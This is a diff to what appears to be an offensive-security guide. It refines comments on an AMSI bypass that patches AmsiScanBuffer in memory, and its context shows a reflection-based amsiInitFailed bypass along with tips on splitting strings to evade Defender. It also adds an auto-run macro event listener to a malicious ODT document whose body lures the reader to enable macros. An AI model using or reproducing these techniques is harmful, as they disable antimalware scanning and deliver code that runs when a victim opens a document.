@@ -87,7 +87,8 @@ $a.GetField(('am'+'siIni'+'tFail'+'ed'),'NonPublic,Static').SetValue($null,$true
 
 ```powershell
 # Allocate writable memory over AmsiScanBuffer prologue and write `mov eax,0x80070057; ret`
-# (AMSI_RESULT_NOT_DETECTED) — multiple public PoCs (Tal Liberman, Adepts of 0xCC).
+# 0x80070057 = E_INVALIDARG HRESULT — non-S_OK return causes the AMSI consumer to skip scanning.
+# (Not the AMSI_RESULT enum; that's a different value space.) Multiple public PoCs (Tal Liberman, Adepts of 0xCC).
 # Modern Defender flags string `AmsiScanBuffer` literal in PowerShell — load via reflection or strings split.
 
 $Win32 = @"
@@ -1064,7 +1065,15 @@ EOF
 cat > odt_linux/content.xml <<'EOF'
 <?xml version="1.0" encoding="UTF-8"?>
 <office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
-  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2">
+  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
+  xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"
+  xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.2">
+  <office:scripts>
+    <office:event-listeners>
+      <script:event-listener script:language="ooo:Basic" script:event-name="dom:load"
+        xlink:href="vnd.sun.star.script:Standard.Module1.OnLoad?language=Basic&amp;location=document" xlink:type="simple"/>
+    </office:event-listeners>
+  </office:scripts>
   <office:body><office:text><text:p>Please enable macros to view this document.</text:p></office:text></office:body>
 </office:document-content>
 EOF
